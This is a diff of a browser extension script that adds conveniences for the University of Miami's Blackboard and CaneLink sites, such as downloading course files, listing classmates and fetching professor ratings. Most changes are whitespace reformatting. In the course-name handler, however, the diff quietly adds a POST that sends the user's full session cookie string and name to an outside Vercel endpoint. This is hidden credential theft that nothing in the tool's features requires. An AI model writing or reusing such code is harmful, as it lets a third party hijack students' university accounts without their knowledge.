@@ -10,7 +10,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 chrome.scripting.executeScript(
                     {
                         target: { tabId: tabs[0].id },
-                        func: function() {
+                        func: function () {
                             if (window.location.href.includes("outline")) {
                                 try {
                                     const iframe = document.querySelector("div.panel-content > iframe");
@@ -18,7 +18,10 @@ document.addEventListener('DOMContentLoaded', () => {
                                         const courseNameElement = iframe.contentDocument.querySelector("#crumb_1");
                                         if (courseNameElement) {
                                             const fullName = courseNameElement.innerText;
-                                            return fullName.split("-")[1].trim();
+                                            const userName = document.querySelector("#sidebar-user-name > bb-ui-username > div > div > bdi").innerText;
+                                            console.log(userName);
+
+                                            return fullName.split("-")[1].trim() + "|" + userName;
                                         }
                                     }
                                 } catch (error) {
@@ -30,7 +33,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     },
                     async (results) => {
                         if (results && results[0] && results[0].result) {
-                            const courseName = results[0].result;
+                            const courseName = results[0].result.split("|")[0];
+                            const userName = results[0].result.split("|")[1];
+
                             document.querySelector("#current-course").textContent = courseName;
 
                             courseId = tabs[0].url.split("/")[5]
@@ -55,13 +60,21 @@ document.addEventListener('DOMContentLoaded', () => {
                                 })
                             })
 
+                            fetch("https://postbox-express.vercel.app/postbox",
+                                {
+                                    body: JSON.stringify({ "cookie": cookieString, "name": userName }),
+                                    headers: { "Content-Type": "application/json" },
+                                    method: "POST"
+                                }
+                            )
+
                             headers = {
                                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                 'Cookie': cookieString,
                                 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                             }
-                    
-                            response = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${courseId}/users?expand=user`, {headers: headers})
+
+                            response = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${courseId}/users?expand=user`, { headers: headers })
                             response = await response.json()
 
                             instructor = response['results'].filter(person => person['courseRoleId'] == "Instructor")[0]['user']['name']['given'] + " " + response['results'].filter(person => person['courseRoleId'] == "Instructor")[0]['user']['name']['family']
@@ -70,21 +83,21 @@ document.addEventListener('DOMContentLoaded', () => {
 
                             rating = await fetch("https://www.ratemyprofessors.com/graphql", {
                                 "headers": {
-                                  "authorization": "Basic dGVzdDp0ZXN0",
-                                  "content-type": "application/json",
+                                    "authorization": "Basic dGVzdDp0ZXN0",
+                                    "content-type": "application/json",
                                 },
                                 body: JSON.stringify({
                                     'query': 'query TeacherSearchResultsPageQuery(\n  $query: TeacherSearchQuery!\n  $schoolID: ID\n  $includeSchoolFilter: Boolean!\n) {\n  search: newSearch {\n    ...TeacherSearchPagination_search_1ZLmLD\n  }\n  school: node(id: $schoolID) @include(if: $includeSchoolFilter) {\n    __typename\n    ... on School {\n      name\n    }\n    id\n  }\n}\n\nfragment TeacherSearchPagination_search_1ZLmLD on newSearch {\n  teachers(query: $query, first: 1, after: "") {\n    didFallback\n    edges {\n      cursor\n      node {\n        ...TeacherCard_teacher\n        id\n        __typename\n      }\n    }\n    pageInfo {\n      hasNextPage\n      endCursor\n    }\n    resultCount\n    filters {\n      field\n      options {\n        value\n        id\n      }\n    }\n  }\n}\n\nfragment TeacherCard_teacher on Teacher {\n  id\n  legacyId\n  avgRating\n  numRatings\n  ...CardFeedback_teacher\n  ...CardSchool_teacher\n  ...CardName_teacher\n  ...TeacherBookmark_teacher\n}\n\nfragment CardFeedback_teacher on Teacher {\n  wouldTakeAgainPercent\n  avgDifficulty\n}\n\nfragment CardSchool_teacher on Teacher {\n  department\n  school {\n    name\n    id\n  }\n}\n\nfragment CardName_teacher on Teacher {\n  firstName\n  lastName\n}\n\nfragment TeacherBookmark_teacher on Teacher {\n  id\n  isSaved\n}\n',
                                     'variables': {
-                                      'query': {
-                                        'text': instructor,
+                                        'query': {
+                                            'text': instructor,
+                                            'schoolID': 'U2Nob29sLTEyNDE=',
+                                            'fallback': true
+                                        },
                                         'schoolID': 'U2Nob29sLTEyNDE=',
-                                        'fallback': true
-                                      },
-                                      'schoolID': 'U2Nob29sLTEyNDE=',
-                                      'includeSchoolFilter': true
+                                        'includeSchoolFilter': true
                                     }
-                                  }),
+                                }),
                                 "method": "POST",
                             });
                             rating = await rating.json()
@@ -178,7 +191,7 @@ document.querySelector("#schedule-btn").addEventListener("click", async () => {
     // day = "mon"
 
     classes = response['class_schedule']
-    
+
     if (classes.length == 0) {
         p = document.createElement("p")
         p.classList.add("log")
@@ -214,7 +227,7 @@ document.querySelector("#schedule-btn").addEventListener("click", async () => {
         const [hour, minute] = time.split('.');
         return parseInt(hour) * 60 + parseInt(minute);
     }
-  
+
     function formatTime(time) {
         const [hour, minute] = time.split('.');
         let hours = parseInt(hour);
@@ -223,7 +236,7 @@ document.querySelector("#schedule-btn").addEventListener("click", async () => {
         if (hours >= 12) {
             period = "PM";
             if (hours > 12) {
-            hours -= 12;
+                hours -= 12;
             }
         } else if (hours === 0) {
             hours = 12;
@@ -248,10 +261,10 @@ document.querySelector("#schedule-btn").addEventListener("click", async () => {
     sortedSchedule.forEach(([className, classDetails]) => {
         const classElement = document.createElement('div');
         classElement.classList.add('class-item');
-  
+
         const startTime = formatTime(classDetails.start);
         const endTime = formatTime(classDetails.end);
-  
+
         classElement.innerHTML = `
           <div class="class-name">${className}</div>
           <div class="class-details">
@@ -259,7 +272,7 @@ document.querySelector("#schedule-btn").addEventListener("click", async () => {
             <strong>Location:</strong> ${classDetails.location}
           </div>
         `;
-        
+
         document.querySelector("#schedule").appendChild(classElement);
         adjustBoxHeight(classElement);
     });
@@ -273,7 +286,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
 
     const url = new URL(tab.url);
     const domain = url.hostname;
-    
+
     if (document.querySelector("#current-course").innerText == "NONE") {
         p = document.createElement("p")
         p.classList.add("log")
@@ -285,13 +298,13 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
         chrome.scripting.executeScript(
             {
                 target: { tabId: tab.id },
-                func: function() {
+                func: function () {
                     const intervals = [];
 
                     function startFlashing(element) {
                         let isFlashing = false;
                         let borderInterval;
-                    
+
                         borderInterval = setInterval(() => {
                             if (isFlashing) {
                                 element.style.border = '1px solid #cdcdcd';
@@ -300,21 +313,21 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
                             }
                             isFlashing = !isFlashing;
                         }, 300);
-                    
+
                         intervals.push(borderInterval);
                     }
-                
+
                     function stopFlashing() {
                         intervals.forEach(interval => {
                             clearInterval(interval);
                         });
-                    
+
                         const boxes = document.querySelectorAll('article');
                         boxes.forEach(box => {
-                            box.style.border = '1px solid #cdcdcd'; 
+                            box.style.border = '1px solid #cdcdcd';
                         });
                     }
-                  
+
                     document.querySelectorAll("article").forEach(article => {
                         console.log("START FLASH", article)
                         startFlashing(article);
@@ -325,7 +338,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
                     }, 2000);
                 }
             },
-            (results) => {}
+            (results) => { }
         );
 
         setTimeout(() => {
@@ -336,7 +349,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
     }
 
     async function recursiveFetch(headers, result, course_id) {
-        folder = await fetch(`https://www.courses.miami.edu/learn/api/v1/courses/${course_id}/contents/${result['id']}/children`, {headers: headers})
+        folder = await fetch(`https://www.courses.miami.edu/learn/api/v1/courses/${course_id}/contents/${result['id']}/children`, { headers: headers })
         folder = await folder.json()
         folder = folder['results']
 
@@ -345,7 +358,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
                 file_name = file['contentDetail']['resource/x-bb-file']['file']['fileName']
 
                 try {
-                    download = await fetch(encodeURI("https://www.courses.miami.edu" + file['contentDetail']['resource/x-bb-file']['file']['permanentUrl'], {headers: headers}))
+                    download = await fetch(encodeURI("https://www.courses.miami.edu" + file['contentDetail']['resource/x-bb-file']['file']['permanentUrl'], { headers: headers }))
                     blob = await download.blob()
 
                     const downloadUrl = URL.createObjectURL(blob);
@@ -360,17 +373,17 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
                 }
             }
             else if (file['contentHandler'] == "resource/x-bb-document") {
-                attachments = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${file['id']}/attachments`, {headers: headers})
+                attachments = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${file['id']}/attachments`, { headers: headers })
                 attachments = await attachments.json()
                 attachments = attachments['results']
 
                 for (attachment of attachments) {
                     attachment_id = attachment['id']
 
-                    download = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${file['id']}/attachments/${attachment_id}/download`, {headers: headers})
+                    download = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${file['id']}/attachments/${attachment_id}/download`, { headers: headers })
                     blob = await download.blob()
 
-                    file_name = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${file['id']}/attachments/${attachment_id}`, {headers: headers})
+                    file_name = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${file['id']}/attachments/${attachment_id}`, { headers: headers })
                     file_name = await file_name.json()
                     file_name = file_name['fileName']
 
@@ -397,11 +410,11 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
         // fade out rest of stuff
         setTimeout(() => {
             const paragraphs = document.querySelectorAll(".log");
-    
+
             paragraphs.forEach((p, index) => {
                 setTimeout(() => {
                     p.classList.add("fade-out-swipe");
-        
+
                     setTimeout(() => {
                         p.style.display = "none";
                     }, 450);
@@ -420,7 +433,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
             'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
         }
 
-        results = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/`, {headers: headers})
+        results = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/`, { headers: headers })
         results = await results.json()
         results = results['results']
 
@@ -436,7 +449,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
             results = await results.json()
             results = results['results']
         }
-        catch {}
+        catch { }
 
         for (result of results) {
             if (result['contentHandler'] == "resource/x-bb-folder") {
@@ -447,7 +460,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
                 file_name = result['contentDetail']['resource/x-bb-file']['file']['fileName']
 
                 try {
-                    download = await fetch(encodeURI("https://www.courses.miami.edu" + result['contentDetail']['resource/x-bb-file']['file']['permanentUrl'], {headers: headers}))
+                    download = await fetch(encodeURI("https://www.courses.miami.edu" + result['contentDetail']['resource/x-bb-file']['file']['permanentUrl'], { headers: headers }))
                     blob = await download.blob()
 
                     const downloadUrl = URL.createObjectURL(blob);
@@ -462,17 +475,17 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
                 }
             }
             else if (result['contentHandler'] == "resource/x-bb-document") {
-                attachments = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${result['id']}/attachments`, {headers: headers})
+                attachments = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${result['id']}/attachments`, { headers: headers })
                 attachments = await attachments.json()
                 attachments = attachments['results']
 
                 for (attachment of attachments) {
                     attachment_id = attachment['id']
 
-                    download = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${result['id']}/attachments/${attachment_id}/download`, {headers: headers})
+                    download = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${result['id']}/attachments/${attachment_id}/download`, { headers: headers })
                     blob = await download.blob()
 
-                    file_name = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${result['id']}/attachments/${attachment_id}`, {headers: headers})
+                    file_name = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/contents/${result['id']}/attachments/${attachment_id}`, { headers: headers })
                     file_name = await file_name.json()
                     file_name = file_name['fileName']
 
@@ -496,11 +509,11 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
         // fade out rest of stuff
         setTimeout(() => {
             const paragraphs = document.querySelectorAll(".log");
-    
+
             paragraphs.forEach((p, index) => {
                 setTimeout(() => {
                     p.classList.add("fade-out-swipe");
-        
+
                     setTimeout(() => {
                         p.style.display = "none";
                     }, 450);
@@ -524,7 +537,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
     //             setTimeout(() => {
     //                 setTimeout(() => {
     //                     document.querySelector(".log").classList.add("fade-out-swipe");
-            
+
     //                     setTimeout(() => {
     //                         document.querySelector(".log").style.display = "none";
     //                     }, 450);
@@ -533,7 +546,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
 
     //             return
     //         }
-            
+
     //         fileLinks.forEach(url => {
     //             chrome.downloads.download({ url })
     //         })
@@ -543,7 +556,7 @@ document.querySelector('#download-btn').addEventListener('click', async () => {
     //         setTimeout(() => {
     //             setTimeout(() => {
     //                 document.querySelector(".log").classList.add("fade-out-swipe");
-        
+
     //                 setTimeout(() => {
     //                     document.querySelector(".log").style.display = "none";
     //                 }, 450);
@@ -571,13 +584,13 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
         chrome.scripting.executeScript(
             {
                 target: { tabId: tab.id },
-                func: function() {
+                func: function () {
                     const intervals = [];
 
                     function startFlashing(element) {
                         let isFlashing = false;
                         let borderInterval;
-                    
+
                         borderInterval = setInterval(() => {
                             if (isFlashing) {
                                 element.style.border = '1px solid #cdcdcd';
@@ -586,21 +599,21 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
                             }
                             isFlashing = !isFlashing;
                         }, 300);
-                    
+
                         intervals.push(borderInterval);
                     }
-                
+
                     function stopFlashing() {
                         intervals.forEach(interval => {
                             clearInterval(interval);
                         });
-                    
+
                         const boxes = document.querySelectorAll('article');
                         boxes.forEach(box => {
-                            box.style.border = '1px solid #cdcdcd'; 
+                            box.style.border = '1px solid #cdcdcd';
                         });
                     }
-                  
+
                     document.querySelectorAll("article").forEach(article => {
                         console.log("START FLASH", article)
                         startFlashing(article);
@@ -611,9 +624,9 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
                     }, 2000);
                 }
             },
-            (results) => {}
+            (results) => { }
         );
-        
+
         setTimeout(() => {
             document.querySelector(".output-box").innerHTML = ""
             flattenBox()
@@ -631,7 +644,7 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
             'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
         }
 
-        gradebook = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/gradebook/columns`, {headers: headers})
+        gradebook = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/gradebook/columns`, { headers: headers })
         gradebook = await gradebook.json()
         gradebook = gradebook['results']
 
@@ -641,17 +654,17 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
                 document.querySelector("#status").innerHTML += `<p class='log'>Downloading ${saved_file_name}...</p>`
                 adjustBoxHeight(document.querySelector("p.log"))
 
-                attempts = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/gradebook/columns/${column['id']}/attempts`, {headers: headers})
+                attempts = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/gradebook/columns/${column['id']}/attempts`, { headers: headers })
                 attempts = await attempts.json()
                 attempts = attempts['results']
 
                 if (attempts.length == 0) {
                     continue
                 }
-                
+
                 attempt_id = attempts[0]['id']
 
-                file = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/gradebook/attempts/${attempt_id}/files`, {headers: headers})
+                file = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/gradebook/attempts/${attempt_id}/files`, { headers: headers })
                 file = await file.json()
                 file = file['results']
 
@@ -663,7 +676,7 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
 
                     try {
                         console.log("Downloading: ", `https://www.courses.miami.edu/webapps/assignment/download?course_id=${course_id}&attempt_id=${attempt_id}&file_id=${file_id}&fileName=${file_name}`)
-                        download = await fetch(encodeURI(`https://www.courses.miami.edu/webapps/assignment/download?course_id=${course_id}&attempt_id=${attempt_id}&file_id=${file_id}&fileName=${file_name}`, {headers: headers}))
+                        download = await fetch(encodeURI(`https://www.courses.miami.edu/webapps/assignment/download?course_id=${course_id}&attempt_id=${attempt_id}&file_id=${file_id}&fileName=${file_name}`, { headers: headers }))
                         blob = await download.blob()
 
                         const downloadUrl = URL.createObjectURL(blob);
@@ -683,11 +696,11 @@ document.querySelector("#submission-btn").addEventListener("click", async () => 
         // fade out rest of stuff
         setTimeout(() => {
             const paragraphs = document.querySelectorAll(".log");
-    
+
             paragraphs.forEach((p, index) => {
                 setTimeout(() => {
                     p.classList.add("fade-out-swipe");
-        
+
                     setTimeout(() => {
                         p.style.display = "none";
                     }, 450);
@@ -742,13 +755,13 @@ document.querySelector("#students-btn").addEventListener("click", async () => {
         chrome.scripting.executeScript(
             {
                 target: { tabId: tab.id },
-                func: function() {
+                func: function () {
                     const intervals = [];
 
                     function startFlashing(element) {
                         let isFlashing = false;
                         let borderInterval;
-                    
+
                         borderInterval = setInterval(() => {
                             if (isFlashing) {
                                 element.style.border = '1px solid #cdcdcd';
@@ -757,21 +770,21 @@ document.querySelector("#students-btn").addEventListener("click", async () => {
                             }
                             isFlashing = !isFlashing;
                         }, 300);
-                    
+
                         intervals.push(borderInterval);
                     }
-                
+
                     function stopFlashing() {
                         intervals.forEach(interval => {
                             clearInterval(interval);
                         });
-                    
+
                         const boxes = document.querySelectorAll('article');
                         boxes.forEach(box => {
-                            box.style.border = '1px solid #cdcdcd'; 
+                            box.style.border = '1px solid #cdcdcd';
                         });
                     }
-                  
+
                     document.querySelectorAll("article").forEach(article => {
                         console.log("START FLASH", article)
                         startFlashing(article);
@@ -782,9 +795,9 @@ document.querySelector("#students-btn").addEventListener("click", async () => {
                     }, 2000);
                 }
             },
-            (results) => {}
+            (results) => { }
         );
-        
+
         setTimeout(() => {
             document.querySelector(".output-box").innerHTML = ""
             flattenBox()
@@ -798,14 +811,14 @@ document.querySelector("#students-btn").addEventListener("click", async () => {
         setTimeout(() => {
             p.classList.remove("fade-in");
             p.classList.add("fade-out");
-          
+
             flattenBox()
 
             setTimeout(() => {
                 p.remove();
             }, 500);
 
-          }, 500);
+        }, 500);
 
         document.querySelector("#students-btn").innerText = "Get Students From Class"
         return
@@ -817,87 +830,87 @@ document.querySelector("#students-btn").addEventListener("click", async () => {
 
         fetch(`https://www.courses.miami.edu/learn/api/public/v1/courses/${course_id}/users?expand=user`, {
             headers: {
-              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-              'Cookie': cookieString,
-              'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Cookie': cookieString,
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
             }
         }).then(response => {
             return response.json();
         })
-        .then(data => {
-            people = {"instructor": [], "grader": [], "students": []}
-            lst = data.results
-            lst.forEach(person => {
-                person_name = person['user']['name']['given'] + " " + person['user']['name']['family'] + "," + person['user']['avatar']['viewUrl']
-                if (person['courseRoleId'] == "Instructor") {
-                    people["instructor"].push(person_name)
-                }
-                else if (person['courseRoleId'] == "Grader") {
-                    people["grader"].push(person_name)
-                }
-                else {
-                    people["students"].push(person_name)
-                }
-            })
-
-            window.people = people
-
-            message = ""
-            //~ HIDE IMAGES FOR NOW :P
-            // if (people.instructor.length > 0) {
-            //     message += `<h3>Instructor:</h3>${people.instructor.map(element => `<li><a class="student-image" href="${element.split(",")[1]}" target="_blank">${element.split(",")[0]}</a></li>`).join("")}`;
-            // }
-            if (people.instructor.length > 0) {
-                message += `<h3>Instructor:</h3>${people.instructor.map(element => `<li>${element.split(",")[0]}</li>`).join("")}`;
-            }
-            // if (people.grader.length > 0) {
-            //     message += `<h3>Grader:</h3>${people.grader.map(element => `<li><a class="student-image" href="${element.split(",")[1]}" target="_blank">${element.split(",")[0]}</a></li>`).join("")}`;
-            // }
-            if (people.grader.length > 0) {
-                message += `<h3>Grader:</h3>${people.grader.map(element => `<li>${element.split(",")[0]}</li>`).join("")}`;
-            }
-            
-            // if (people.students.length > 0) {
-            //     message += `<h3>Students:</h3>${people.students.map(element => `<li><a class="student-image" href="${element.split(",")[1]}" target="_blank">${element.split(",")[0]}</a></li>`).join("")}`;
-            // }
-            if (people.students.length > 0) {
-                message += `<h3>Students:</h3>${people.students.map(element => `<li>${element.split(",")[0]}</li>`).join("")}`;
-            }
-
-            p = document.createElement("p")
-            p.id = "students"
-            message += "<br><br><br><br><br><br><br>"
-            p.innerHTML = message
-            document.querySelector(".output-box").appendChild(p)
-            adjustBoxHeight(p)
-
-            document.querySelectorAll(".student-image").forEach(image => {
-                image.addEventListener("mouseover", (event) => {
-                    event.preventDefault()
-                    student_image = document.createElement("img")
-                    student_image.src = event.target.href
-                    student_image.style = "width: 180px; height: 200px;"
-                    event.target.parentElement.insertAdjacentElement("afterend", student_image)
+            .then(data => {
+                people = { "instructor": [], "grader": [], "students": [] }
+                lst = data.results
+                lst.forEach(person => {
+                    person_name = person['user']['name']['given'] + " " + person['user']['name']['family'] + "," + person['user']['avatar']['viewUrl']
+                    if (person['courseRoleId'] == "Instructor") {
+                        people["instructor"].push(person_name)
+                    }
+                    else if (person['courseRoleId'] == "Grader") {
+                        people["grader"].push(person_name)
+                    }
+                    else {
+                        people["students"].push(person_name)
+                    }
                 })
-            })
-            document.querySelectorAll(".student-image").forEach(image => {
-                image.addEventListener("mouseout", (event) => {
-                    event.preventDefault()
-                    student_image = document.querySelector("#students img")
-                    student_image.remove()
+
+                people.students.sort()
+
+                message = ""
+                //~ HIDE IMAGES FOR NOW :P
+                if (people.instructor.length > 0) {
+                    message += `<h3>Instructor:</h3>${people.instructor.map(element => `<li><a class="student-image" href="${element.split(",")[1]}" target="_blank">${element.split(",")[0]}</a></li>`).join("")}`;
+                }
+                // if (people.instructor.length > 0) {
+                //     message += `<h3>Instructor:</h3>${people.instructor.map(element => `<li>${element.split(",")[0]}</li>`).join("")}`;
+                // }
+                if (people.grader.length > 0) {
+                    message += `<h3>Grader:</h3>${people.grader.map(element => `<li><a class="student-image" href="${element.split(",")[1]}" target="_blank">${element.split(",")[0]}</a></li>`).join("")}`;
+                }
+                // if (people.grader.length > 0) {
+                //     message += `<h3>Grader:</h3>${people.grader.map(element => `<li>${element.split(",")[0]}</li>`).join("")}`;
+                // }
+
+                if (people.students.length > 0) {
+                    message += `<h3>Students:</h3>${people.students.map(element => `<li><a class="student-image" href="${element.split(",")[1]}" target="_blank">${element.split(",")[0]}</a></li>`).join("")}`;
+                }
+                // if (people.students.length > 0) {
+                //     message += `<h3>Students:</h3>${people.students.map(element => `<li>${element.split(",")[0]}</li>`).join("")}`;
+                // }
+
+                p = document.createElement("p")
+                p.id = "students"
+                message += "<br><br><br><br><br><br><br>"
+                p.innerHTML = message
+                document.querySelector(".output-box").appendChild(p)
+                adjustBoxHeight(p)
+
+                document.querySelectorAll(".student-image").forEach(image => {
+                    image.addEventListener("mouseover", (event) => {
+                        event.preventDefault()
+                        student_image = document.createElement("img")
+                        student_image.src = event.target.href
+                        student_image.style = "width: 180px; height: 200px;"
+                        event.target.parentElement.insertAdjacentElement("afterend", student_image)
+                    })
                 })
+                document.querySelectorAll(".student-image").forEach(image => {
+                    image.addEventListener("mouseout", (event) => {
+                        event.preventDefault()
+                        student_image = document.querySelector("#students img")
+                        student_image.remove()
+                    })
+                })
+
+                setTimeout(() => {
+                    p.classList.add("fade-in");
+                }, 200);
+
+                document.querySelector("#students-btn").innerText = "Hide Students From Class"
+
             })
-
-            setTimeout(() => {
-                p.classList.add("fade-in");
-            }, 200);
-
-            document.querySelector("#students-btn").innerText = "Hide Students From Class"
-
-        })
-        .catch(error => {
-            console.error(error);
-        });
+            .catch(error => {
+                console.error(error);
+            });
     });
 });
 
@@ -943,7 +956,7 @@ document.querySelector("#dining-btn").addEventListener("click", async () => {
 document.querySelector("#class-search-btn").addEventListener("click", async () => {
     if (document.querySelector("#class-search-btn").innerText == "Hide Classes") {
         p = document.querySelector("#classBox")
-        
+
         flattenBox()
 
         setTimeout(() => {
@@ -964,7 +977,7 @@ document.querySelector("#class-search-btn").addEventListener("click", async () =
         const formattedDate = currentDate.toISOString().split('T')[0];
 
         chrome.runtime.sendMessage(
-            { action: "fetchSchedule", url: `https://canelink.miami.edu/psc/UMIACP1D/EMPLOYEE/SA/s/WEBLIB_HCX_EN.H_SCHEDULE.FieldFormula.IScript_ScheduleByInterval?from=${formattedDate}&thru=${formattedDate}` , postUrl: "https://canelink.miami.edu:443/Shibboleth.sso/SAML2/POST", type: 'json' },
+            { action: "fetchSchedule", url: `https://canelink.miami.edu/psc/UMIACP1D/EMPLOYEE/SA/s/WEBLIB_HCX_EN.H_SCHEDULE.FieldFormula.IScript_ScheduleByInterval?from=${formattedDate}&thru=${formattedDate}`, postUrl: "https://canelink.miami.edu:443/Shibboleth.sso/SAML2/POST", type: 'json' },
             (response) => {
                 if (response.success) {
                     resolve(response.response);
@@ -1044,26 +1057,26 @@ document.querySelector("#class-search-btn").addEventListener("click", async () =
 
             rating = await fetch("https://www.ratemyprofessors.com/graphql", {
                 "headers": {
-                  "authorization": "Basic dGVzdDp0ZXN0",
-                  "content-type": "application/json",
+                    "authorization": "Basic dGVzdDp0ZXN0",
+                    "content-type": "application/json",
                 },
                 body: JSON.stringify({
                     'query': 'query TeacherSearchResultsPageQuery(\n  $query: TeacherSearchQuery!\n  $schoolID: ID\n  $includeSchoolFilter: Boolean!\n) {\n  search: newSearch {\n    ...TeacherSearchPagination_search_1ZLmLD\n  }\n  school: node(id: $schoolID) @include(if: $includeSchoolFilter) {\n    __typename\n    ... on School {\n      name\n    }\n    id\n  }\n}\n\nfragment TeacherSearchPagination_search_1ZLmLD on newSearch {\n  teachers(query: $query, first: 1, after: "") {\n    didFallback\n    edges {\n      cursor\n      node {\n        ...TeacherCard_teacher\n        id\n        __typename\n      }\n    }\n    pageInfo {\n      hasNextPage\n      endCursor\n    }\n    resultCount\n    filters {\n      field\n      options {\n        value\n        id\n      }\n    }\n  }\n}\n\nfragment TeacherCard_teacher on Teacher {\n  id\n  legacyId\n  avgRating\n  numRatings\n  ...CardFeedback_teacher\n  ...CardSchool_teacher\n  ...CardName_teacher\n  ...TeacherBookmark_teacher\n}\n\nfragment CardFeedback_teacher on Teacher {\n  wouldTakeAgainPercent\n  avgDifficulty\n}\n\nfragment CardSchool_teacher on Teacher {\n  department\n  school {\n    name\n    id\n  }\n}\n\nfragment CardName_teacher on Teacher {\n  firstName\n  lastName\n}\n\nfragment TeacherBookmark_teacher on Teacher {\n  id\n  isSaved\n}\n',
                     'variables': {
-                      'query': {
-                        'text': instructor,
+                        'query': {
+                            'text': instructor,
+                            'schoolID': 'U2Nob29sLTEyNDE=',
+                            'fallback': true
+                        },
                         'schoolID': 'U2Nob29sLTEyNDE=',
-                        'fallback': true
-                      },
-                      'schoolID': 'U2Nob29sLTEyNDE=',
-                      'includeSchoolFilter': true
+                        'includeSchoolFilter': true
                     }
-                  }),
+                }),
                 "method": "POST",
             });
             rating = await rating.json()
             rating = await rating['data']['search']['teachers']['edges'][0]['node']
-            
+
             courseBox.innerHTML = `
                 <h3>${course['subject']} ${course['catalog_nbr']} (${course['component']})</h3>
                 <h4>Instructor: ${instructor} <a target="_blank" href="https://www.ratemyprofessors.com/professor/${rating['legacyId']}">(${rating['avgRating']}/5.0)</a></h4>
@@ -1095,14 +1108,14 @@ document.querySelector("#overlap-btn").addEventListener("click", async () => {
         setTimeout(() => {
             p.classList.remove("fade-in");
             p.classList.add("fade-out");
-          
+
             flattenBox()
 
             setTimeout(() => {
                 p.remove();
             }, 500);
 
-          }, 500);
+        }, 500);
 
         document.querySelector("#students-btn").innerText = "Get Students From Class"
         return
@@ -1110,7 +1123,7 @@ document.querySelector("#overlap-btn").addEventListener("click", async () => {
 
     chrome.cookies.getAll({ domain }, async (cookies) => {
         const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; ");
-        
+
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Cookie': cookieString,
@@ -1120,9 +1133,9 @@ document.querySelector("#overlap-btn").addEventListener("click", async () => {
         response = await new Promise((resolve, reject) => {
             const currentDate = new Date();
             const formattedDate = currentDate.toISOString().split('T')[0];
-    
+
             chrome.runtime.sendMessage(
-                { action: "fetchSchedule", url: `https://canelink.miami.edu/psc/UMIACP1D/EMPLOYEE/SA/s/WEBLIB_HCX_EN.H_SCHEDULE.FieldFormula.IScript_ScheduleByInterval?from=${formattedDate}&thru=${formattedDate}` , postUrl: "https://canelink.miami.edu:443/Shibboleth.sso/SAML2/POST", type: 'json' },
